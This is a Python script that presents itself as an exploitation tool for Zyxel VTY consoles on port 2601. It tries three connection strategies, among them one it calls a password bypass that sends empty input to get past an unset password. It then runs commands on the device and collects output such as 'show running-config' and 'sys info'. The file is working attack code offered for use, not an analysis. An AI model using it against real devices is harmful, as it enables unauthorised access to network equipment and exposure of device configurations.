"""
Zyxel VTY Shell - Multi-strategy VTY console exploitation tool.
Tries multiple handshake patterns to establish a working shell on Zyxel VTY consoles.
"""
import socket
import time
import re

def _try_handshake(target, port, command, timeout):
    """Try one connection with careful handshake."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    try:
        sock.connect((target, port))
        time.sleep(0.8)
        
        # Read initial banner
        banner = b""
        try:
            sock.settimeout(1.5)
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                banner += c
                # Keep reading until we have the full banner
        except socket.timeout:
            pass
        
        # Strategy: Send an empty line followed by command
        time.sleep(0.3)
        sock.sendall(b"\r\n")
        time.sleep(0.5)
        
        # Try to read prompt
        prompt = b""
        try:
            sock.settimeout(1.5)
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                prompt += c
        except socket.timeout:
            pass
        
        # Send the actual command
        sock.sendall((command + "\r\n").encode())
        time.sleep(1.0)
        
        # Read output
        output = b""
        try:
            sock.settimeout(2.0)
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                output += c
        except socket.timeout:
            pass
        
        # Try reading more
        time.sleep(0.5)
        try:
            sock.settimeout(1.0)
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                output += c
        except socket.timeout:
            pass
        
        result = banner.decode("utf-8", errors="replace")
        if prompt:
            result += prompt.decode("utf-8", errors="replace")
        if output:
            result += output.decode("utf-8", errors="replace")
        
        return result
        
    except ConnectionResetError:
        return "CONNECTION_RESET"
    except socket.timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"
    finally:
        try:
            sock.close()
        except:
            pass


def _try_direct_command(target, port, command, timeout):
    """Try connecting and immediately sending the command."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        sock.connect((target, port))
        time.sleep(0.3)
        
        # Read banner
        banner = b""
        try:
            sock.settimeout(1.0)
            banner = sock.recv(4096)
        except socket.timeout:
            pass
        
        # Send command immediately
        sock.sendall((command + "\r\n").encode())
        time.sleep(1.0)
        
        output = b""
        try:
            sock.settimeout(2.0)
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                output += c
        except socket.timeout:
            pass
        
        result = banner.decode("utf-8", errors="replace")
        if output:
            result += output.decode("utf-8", errors="replace")
        return result
        
    except ConnectionResetError:
        return "CONNECTION_RESET"
    except socket.timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"
    finally:
        try:
            sock.close()
        except:
            pass


def _try_with_password_bypass(target, port, command, timeout):
    """Try sending passwords then the command."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        sock.connect((target, port))
        time.sleep(0.5)
        
        # Read banner
        banner = b""
        try:
            sock.settimeout(1.0)
            banner = sock.recv(4096)
        except socket.timeout:
            pass
        
        # Try sending empty password
        sock.sendall(b"\r\n")
        time.sleep(0.5)
        
        # Read response
        resp = b""
        try:
            sock.settimeout(1.0)
            while True:
                c = sock.recv(4096)
                if not c:
                    break
                resp += c
        except socket.timeout:
            pass
        
        # If we got a prompt, send command
        decoded_resp = resp.decode("utf-8", errors="replace")
        if decoded_resp.strip():
            sock.sendall((command + "\r\n").encode())
            time.sleep(1.0)
            output = b""
            try:
                sock.settimeout(2.0)
                while True:
                    c = sock.recv(4096)
                    if not c:
                        break
                    output += c
            except socket.timeout:
                pass
            decoded_resp += output.decode("utf-8", errors="replace")
        
        result = banner.decode("utf-8", errors="replace") + decoded_resp
        return result
        
    except ConnectionResetError:
        return "CONNECTION_RESET"
    except socket.timeout:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"
    finally:
        try:
            sock.close()
        except:
            pass


def zyxel_vty_shell(target: str, port: int = 2601, command: str = "help", timeout: int = 15) -> str:
    """
    Connect to a Zyxel VTY console, handle the passwordless handshake,
    execute a command, and return the output.
    
    Tries multiple handshake strategies to handle the finicky VTY protocol.
    
    Args:
        target: IP address
        port: VTY port (default 2601)
        command: Command to execute (default: "help")
        timeout: Timeout per attempt
        
    Returns:
        Full session output from the best attempt
    """
    strategies = [
        ("Handshake+Command", _try_handshake),
        ("Direct Command", _try_direct_command),
        ("Password Bypass", _try_with_password_bypass),
    ]
    
    results = []
    
    for name, strategy in strategies:
        result = strategy(target, port, command, timeout)
        results.append(f"=== Strategy: {name} ===\n{result}")
        
        # If we got something other than reset/timeout/error, it might have worked
        if result not in ("CONNECTION_RESET", "TIMEOUT") and not result.startswith("ERROR:"):
            if len(result) > len("Vty password is not set.\r\n"):
                # We got meaningful output
                pass
    
    # Also try with common commands
    extra_commands = ["?", "show version", "show running-config", "sys info", "status"]
    for cmd in extra_commands:
        result = _try_handshake(target, port, cmd, timeout)
        if result not in ("CONNECTION_RESET", "TIMEOUT") and not result.startswith("ERROR:"):
            if len(result) > 50:  # Got real output
                results.append(f"=== Command: {cmd} ===\n{result}")
    
    return "\n\n".join(results)
